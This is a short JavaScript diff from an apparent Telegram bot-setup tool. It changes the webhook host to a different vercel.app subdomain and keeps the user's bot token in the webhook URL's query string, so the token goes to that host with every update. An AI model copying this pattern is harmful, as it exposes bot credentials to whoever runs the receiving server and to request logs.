@@ -111,7 +111,7 @@ const validateBotToken = async (token) => {
 };
 
 const setWebhook = async (token) => {
-  const webhookUrl = `https://botmaker-two.vercel.app/created?token=${encodeURIComponent(token)}`;
+  const webhookUrl = `https://vidsc-two.vercel.app/created?token=${encodeURIComponent(token)}`;
   try {
     const response = await axios.get(`https://api.telegram.org/bot${token}/setWebhook`, {
       params: { url: webhookUrl },
